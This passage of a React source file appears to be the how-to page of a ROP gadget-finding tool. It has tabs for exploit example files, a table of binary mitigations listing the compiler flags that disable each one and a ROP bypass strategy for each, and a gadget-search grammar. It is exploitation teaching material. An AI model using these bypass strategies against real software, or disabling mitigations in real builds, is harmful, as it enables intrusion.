            className={`btn btn-xs mono ${activeCodeTab === 'classic' ? 'btn-primary' : 'btn-secondary'}`}
          >
            1. classic_bof.c (Standard ROP)
          </button>
          <button
            onClick={() => setActiveCodeTab('pivot')}
            className={`btn btn-xs mono ${activeCodeTab === 'pivot' ? 'btn-primary' : 'btn-secondary'}`}
          >
            2. stack_pivot.c (Restricted Buffer)
          </button>
          <button
            onClick={() => setActiveCodeTab('ret2win')}
            className={`btn btn-xs mono ${activeCodeTab === 'ret2win' ? 'btn-primary' : 'btn-secondary'}`}
          >
            3. ret2win.c (Arg Staging)
          </button>
          <button
            onClick={() => setActiveCodeTab('pwntools')}
            className={`btn btn-xs mono ${activeCodeTab === 'pwntools' ? 'btn-primary' : 'btn-secondary'}`}
          >
            4. exploit.py (Pwntools Script)
          </button>
        </div>

        <p className="howto-desc text-muted text-sm">{codeExamples[activeCodeTab].desc}</p>

        <div className="howto-cmd-box mono text-xs text-accent-cyan" style={{ marginBottom: '0.75rem' }}>
          <span>Compilation / Run Command: $ {codeExamples[activeCodeTab].compilerCmd}</span>
        </div>

        <div className="code-display-box overflow-container" style={{ background: '#06080e', padding: '1rem', borderRadius: 'var(--radius-sm)', border: '1px solid var(--border-subtle)' }}>
          <pre className="mono text-xs text-accent-green" style={{ margin: 0, lineHeight: '1.5' }}>
            {codeExamples[activeCodeTab].code}
          </pre>
        </div>
      </div>

      {/* Binary Hardening & Mitigations Comparison Matrix */}
      <div className="howto-card" style={{ marginTop: '2.5rem' }}>
        <div className="howto-card-header">
          <div style={{ display: 'flex', alignItems: 'center', gap: '0.5rem' }}>
            <ShieldCheck size={18} className="text-accent-cyan" />
            <span className="mono font-bold text-accent-cyan text-sm">
              BINARY HARDENING &amp; MITIGATION DEFENSE MATRIX
            </span>
          </div>
        </div>
        <p className="howto-desc text-muted text-sm">
          ROPWeaver's native protection detector inspects binary headers and flags the following security mechanisms:
        </p>
        <div className="table-responsive overflow-container">
          <table className="recent-table mono text-xs">
            <thead>
              <tr>
                <th>Mitigation</th>
                <th>Security Purpose</th>
                <th>How to Disable for Testing</th>
                <th>ROP Bypass Strategy</th>
              </tr>
            </thead>
            <tbody>
              <tr className="recent-row">
                <td className="text-accent-green font-bold">NX / DEP</td>
                <td>Marks the stack and heap non-executable (W^X). Prevents direct shellcode execution.</td>
                <td><code>-z execstack</code> (GCC) / <code>/NXCOMPAT:NO</code> (MSVC)</td>
                <td>Use Return-Oriented Programming (ROP) to chain existing executable code in memory.</td>
              </tr>
              <tr className="recent-row">
                <td className="text-accent-cyan font-bold">Stack Canary</td>
                <td>Inserts a random guard value before saved return address. Detects buffer overflows.</td>
                <td><code>-fno-stack-protector</code> (GCC/Clang) / <code>/GS-</code> (MSVC)</td>
                <td>Information leak to read canary, or overwrite function pointers / exception handlers.</td>
              </tr>
              <tr className="recent-row">
                <td className="text-accent-orange font-bold">PIE / ASLR</td>
                <td>Randomizes virtual memory addresses on each process launch.</td>
                <td><code>-no-pie</code> (GCC) / <code>/DYNAMICBASE:NO</code> (MSVC)</td>
                <td>Information leak to calculate binary base address, or partial address overwrites.</td>
              </tr>
              <tr className="recent-row">
                <td className="text-dim font-bold">RELRO</td>
                <td>Marks Global Offset Table (GOT) sections read-only to prevent GOT hijacking.</td>
                <td><code>-Wl,-z,norelro</code> (GCC)</td>
                <td>Target function return addresses instead of modifying GOT pointers.</td>
              </tr>
            </tbody>
          </table>
        </div>
      </div>

      {/* Universal Search Grammar */}
      <div className="howto-card" style={{ marginTop: '2.5rem' }}>
        <div className="howto-card-header">
          <span className="mono font-bold text-accent-orange text-sm">
            <Code2 size={16} /> UNIVERSAL GADGET SEARCH GRAMMAR &amp; WILDCARDS
          </span>
        </div>
        <p className="howto-desc text-muted text-sm">
          ROPWeaver includes a fast regex and wildcard query engine supported identically across Linux, Windows, macOS, ARM, and RISC-V:
        </p>
        <div className="grammar-grid mono text-xs">
          <div className="grammar-item">
            <span className="grammar-token text-accent-green">?</span>
            <span className="grammar-meaning text-muted">Matches exactly one wildcard instruction (e.g. <code>pop ? ; ret</code>)</span>
          </div>
          <div className="grammar-item">
            <span className="grammar-token text-accent-green">%</span>
            <span className="grammar-meaning text-muted">Matches one or more intermediate instructions</span>
          </div>
          <div className="grammar-item">
            <span className="grammar-token text-accent-green">$</span>
            <span className="grammar-meaning text-muted">Matches instruction prefix (e.g. <code>pop$</code> matches pop rdi, pop rax, pop rsi)</span>
          </div>
          <div className="grammar-item">
            <span className="grammar-token text-accent-green">-</span>
            <span className="grammar-meaning text-muted">Excludes specific registers or opcodes (e.g. <code>-rsp -rbp</code>)</span>
          </div>
        </div>
      </div>
    </div>
  );
}
